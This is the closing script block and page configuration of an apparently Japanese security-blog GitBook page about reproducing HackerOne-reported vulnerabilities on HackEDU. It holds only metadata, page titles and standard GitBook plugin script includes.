            gitbook.page.hasChanged({"page":{"title":"HackerOneに報告された脆弱性をHackEDUで再現する","level":"2.1","depth":1,"next":{"title":"CRLFインジェクションによるCookie Bombの脅威","level":"3.1","depth":1,"path":"2018/impact_of_cookie_bomb.md","ref":"2018/impact_of_cookie_bomb.md","articles":[]},"previous":{"title":"Akaki I/O","level":"1.1","depth":1,"path":"README.md","ref":"README.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["-sharing"],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"book.css"}},"file":{"path":"2019/hackedu.md","mtime":"2019-03-21T13:03:21.061Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-03-21T22:46:01.183Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

